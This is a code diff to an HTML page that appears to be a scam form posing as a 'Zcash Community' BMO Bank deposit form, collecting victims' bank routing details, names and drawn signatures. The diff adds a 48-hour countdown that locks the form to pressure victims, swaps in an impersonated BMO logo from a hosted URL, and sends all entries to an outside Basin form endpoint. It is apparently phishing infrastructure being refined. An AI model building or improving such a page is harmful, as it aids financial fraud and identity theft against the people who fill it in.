@@ -36,9 +36,12 @@
   .step{display:flex;align-items:center;gap:10px;font-weight:900;margin:18px 0 10px;font-size:16px}
   .num{width:28px;height:28px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-size:14px;flex:0 0 auto}
   .notice{background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;border-radius:10px;padding:10px;font-size:13px;line-height:1.4;margin-bottom:12px}
-  .bmo-banner{display:flex;flex-direction:column;align-items:center;gap:8px;background:#ffffff;border:1px solid #c7d2fe;border-radius:12px;padding:14px;margin-bottom:14px}
-  .bmo-logo{width:220px;max-width:100%;height:auto;border-radius:6px;display:block}
+  .bmo-banner{display:flex;flex-direction:column;align-items:center;gap:8px;background:#f0f4ff;border:1px solid #c7d2fe;border-radius:12px;padding:14px;margin-bottom:14px}
+  .bmo-logo{width:220px;max-width:100%;height:auto;border-radius:6px;display:block;object-fit:contain;background:#fff}
   .bmo-sub{font-size:12px;color:var(--muted)}
+  .logo-status{font-size:11px;font-weight:800;padding:2px 8px;border-radius:999px;white-space:nowrap}
+  .logo-status.ok{background:#ecfdf5;color:#166534;border:1px solid #bbf7d0}
+  .logo-status.err{background:#fef2f2;color:#991b1b;border:1px solid #fecaca}
   .checks{display:flex;gap:16px;flex-wrap:wrap;background:var(--orange-light);border:1px solid var(--orange-border);padding:12px;border-radius:10px}
   .check{display:flex;align-items:center;gap:8px;font-weight:700;font-size:14px}
   input[type="radio"],input[type="checkbox"]{width:20px;height:20px;accent-color:var(--orange)}
@@ -65,7 +68,19 @@
   .success{display:block;background:var(--green-bg);color:#166534;border:1px solid #bbf7d0}
   .error{display:block;background:#fef2f2;color:#991b1b;border:1px solid #fecaca}
   footer{text-align:center;color:var(--muted);font-size:12px;margin-top:14px}
-  @media (max-width:560px){.card{margin:10px;padding:14px}.row{grid-template-columns:1fr}h1{font-size:22px}.brand{font-size:24px}}
+  .timer-banner{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;background:#0f172a;color:#fff;border-radius:12px;padding:12px 14px;margin-bottom:14px}
+  .timer-label{font-weight:800;font-size:13px;letter-spacing:.4px}
+  .timer-clock{display:flex;gap:8px}
+  .timer-unit{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);border-radius:8px;padding:6px 10px;text-align:center;min-width:54px}
+  .timer-unit .val{font-size:20px;font-weight:900;font-variant-numeric:tabular-nums;line-height:1}
+  .timer-unit .lbl{font-size:10px;opacity:.7;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+  .timer-banner.urgent{background:#7c2d12}
+  .timer-banner.critical{background:#991b1b;animation:pulse 1s infinite}
+  .timer-banner.expired{background:#1f2937}
+  .timer-reset{background:none;border:0;color:#fff;opacity:.75;cursor:pointer;font-size:12px;text-decoration:underline;padding:4px}
+  .timer-reset:hover{opacity:1}
+  @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(239,68,68,.55)}50%{box-shadow:0 0 0 8px rgba(239,68,68,0)}}
+  @media (max-width:560px){.card{margin:10px;padding:14px}.row{grid-template-columns:1fr}h1{font-size:22px}.brand{font-size:24px}.timer-banner{justify-content:center}.timer-clock{order:3;width:100%;justify-content:center}}
 </style>
 </head>
 <body>
@@ -74,18 +89,28 @@
     <header class="header"><div class="logo">Z</div><div class="brand">Zcash <span class="verified">✔</span></div></header>
     <div class="title"><div class="kicker">ZCASH COMMUNITY</div><h1>BMO BANK N.A. DEPOSIT FORM</h1><p class="subtitle">Recipient banking details for fund transfer</p><div class="underline"></div></div>
 
+    <!-- 48-HOUR COUNTDOWN -->
+    <div class="timer-banner" id="timerBanner" role="timer">
+      <div class="timer-label"><span id="timerLabel">⏳ Submit by deadline</span></div>
+      <div class="timer-clock">
+        <div class="timer-unit"><div class="val" id="tD">00</div><div class="lbl">Days</div></div>
+        <div class="timer-unit"><div class="val" id="tH">00</div><div class="lbl">Hrs</div></div>
+        <div class="timer-unit"><div class="val" id="tM">00</div><div class="lbl">Min</div></div>
+        <div class="timer-unit"><div class="val" id="tS">00</div><div class="lbl">Sec</div></div>
+      </div>
+      <button type="button" class="timer-reset" id="timerReset" title="Restart the 48-hour window">↻ Reset</button>
+    </div>
+
     <!-- BASIN CONFIG -->
     <input type="hidden" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
 
+    <!-- BMO HEADER – HOSTED URL -->
     <div class="bmo-banner">
-      <svg class="bmo-logo" viewBox="0 0 340 120" role="img" aria-label="BMO Bank N.A. logo" xmlns="http://www.w3.org/2000/svg">
-        <rect width="340" height="120" rx="6" fill="#FFFFFF;"/>
-        <text x="22" y="82" font-family="Georgia,'Times New Roman',serif" font-size="62" fill="#ffffff" letter-spacing="1">BMO</text>
-        <circle cx="282" cy="60" r="46" fill="#e4002b"/>
-        <path fill="#e4002b" d="M256,48 H266 L282,64 L298,48 H308 V84 H256 Z"/>
-        <path fill="#ffffff" d="M272,72 L282,52 L292,72 Z"/>
-      </svg>
-      <div class="bmo-sub">Bank of Montreal – United States</div>
+      <img id="bmoLogoImg" class="bmo-logo" src="https://YOUR-HOSTED-URL/bmo-logo.png" alt="BMO Bank N.A. logo" width="220" />
+      <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:center">
+        <div class="bmo-sub">Bank of Montreal – United States</div>
+        <span id="logoStatus" class="logo-status" aria-live="polite"></span>
+      </div>
     </div>
     <div class="notice">⚠️ <strong>NOTICE:</strong> All banking details below must exactly match the name registered on the BMO account. Mismatched names may delay or reject the transfer.</div>
 
@@ -158,8 +183,11 @@
 <script>
 (() => {
   // ====== CONFIG ======
-  const BASIN_ENDPOINT = "https://usebasin.com/f/11fc628e04eb"; // <— YOUR BASIN FORM ID
-  const SIGNATURE_SRC = "signature.png"; // Optional pre-stamp image in repo root
+  const BASIN_ENDPOINT = "https://usebasin.com/f/11fc628e04eb";
+  const SIGNATURE_SRC  = "signature.png";
+  const BMO_LOGO_SRC   = "https://YOUR-HOSTED-URL/bmo-logo.png";
+  const DEADLINE_KEY   = "bmoFormDeadline_v1";
+  const TOTAL_MS       = 48 * 3600 * 1000;
   // ====================
 
   const form = document.getElementById("bmoForm");
@@ -172,7 +200,21 @@
   const routingInputs = Array.from(document.querySelectorAll("#routingGroup input"));
   const routingFull = document.getElementById("routingFull");
 
+  // Timer refs
+  const timerBanner = document.getElementById("timerBanner");
+  const timerLabel  = document.getElementById("timerLabel");
+  const tD = document.getElementById("tD");
+  const tH = document.getElementById("tH");
+  const tM = document.getElementById("tM");
+  const tS = document.getElementById("tS");
+
+  // Logo refs
+  const logoImg    = document.getElementById("bmoLogoImg");
+  const logoStatus = document.getElementById("logoStatus");
+
   let drawing = false, hasSignature = false;
+  let expired = false;
+  let lastMissing = [];
 
   // ---- Helpers ----
   const todayLocal = () => {
@@ -181,6 +223,67 @@
     return d.toISOString().split("T")[0];
   };
   dateInput.value = todayLocal();
+
+  // ---- Submit state ----
+  function syncSubmit(){
+    submitBtn.disabled = (lastMissing.length > 0) || expired;
+  }
+
+  // ---- 48-HOUR COUNTDOWN ----
+  let deadline = parseInt(localStorage.getItem(DEADLINE_KEY), 10);
+  if (!deadline || isNaN(deadline) || deadline <= Date.now()) {
+    deadline = Date.now() + TOTAL_MS;
+    localStorage.setItem(DEADLINE_KEY, deadline);
+  }
+  function tick(){
+    const now = Date.now();
+    let rem = deadline - now;
+    if (rem <= 0) {
+      rem = 0;
+      if (!expired) {
+        expired = true;
+        timerBanner.classList.add("expired");
+        timerBanner.classList.remove("urgent", "critical");
+        syncSubmit();
+      }
+    }
+    const d = Math.floor(rem / 86400000);
+    const h = Math.floor((rem % 86400000) / 3600000);
+    const m = Math.floor((rem % 3600000) / 60000);
+    const s = Math.floor((rem % 60000) / 1000);
+    tD.textContent = String(d).padStart(2, "0");
+    tH.textContent = String(h).padStart(2, "0");
+    tM.textContent = String(m).padStart(2, "0");
+    tS.textContent = String(s).padStart(2, "0");
+    timerBanner.classList.toggle("urgent",   rem > 0 && rem <= 12 * 3600000);
+    timerBanner.classList.toggle("critical", rem > 0 && rem <= 1 * 3600000);
+    timerLabel.textContent = expired ? "⛔ Time expired — form locked" : "⏳ Submit by deadline";
+  }
+  setInterval(tick, 1000);
+  tick();
+  document.getElementById("timerReset").addEventListener("click", () => {
+    deadline = Date.now() + TOTAL_MS;
+    localStorage.setItem(DEADLINE_KEY, deadline);
+    expired = false;
+    timerBanner.classList.remove("expired", "urgent", "critical");
+    tick();
+    syncSubmit();
+  });
+
+  // ---- Logo live check ----
+  logoImg.src = BMO_LOGO_SRC;
+  function reviewLogo(){
+    if (logoImg.complete && logoImg.naturalWidth > 0) {
+      logoStatus.textContent = "✓ Logo live";
+      logoStatus.className = "logo-status ok";
+    } else {
+      logoStatus.textContent = "⚠ " + BMO_LOGO_SRC + " not found";
+      logoStatus.className = "logo-status err";
+    }
+  }
+  logoImg.addEventListener("load", reviewLogo);
+  logoImg.addEventListener("error", reviewLogo);
+  window.addEventListener("load", reviewLogo);
 
   // ---- Routing number sync ----
   function updateRouting() {
@@ -293,7 +396,8 @@
       }
     });
     if (!hasSignature) missing.push("Signature (draw or load signature.png)");
-    submitBtn.disabled = missing.length > 0;
+    lastMissing = missing;
+    syncSubmit();
     return missing;
   }
   form.querySelectorAll("input, select, textarea").forEach(el => {
@@ -315,6 +419,11 @@
     e.preventDefault();
     clearMessage();
 
+    if (expired) {
+      showMessage("error", "⏰ The 48-hour window has closed — please reset the timer or contact support.");
+      return;
+    }
+
     const missing = validateForm();
     if (missing.length) { alert("❌ Cannot submit. Missing:\n\n• " + missing.join("\n• ")); return; }
 
@@ -322,11 +431,9 @@
     submitBtn.textContent = "Submitting…";
 
     const formData = new FormData(form);
-    // Ensure the form posts to Basin, not the current page
     form.action = BASIN_ENDPOINT;
 
     try {
-      // Canvas → Blob (cross-browser)
       const sigBlob = await new Promise(res => canvas.toBlob(b => res(b), "image/png"));
       formData.append("signature", sigBlob, "signature.png");
 
@@ -358,4 +465,4 @@
 })();
 </script>
 </body>
-    </html>
+</html>
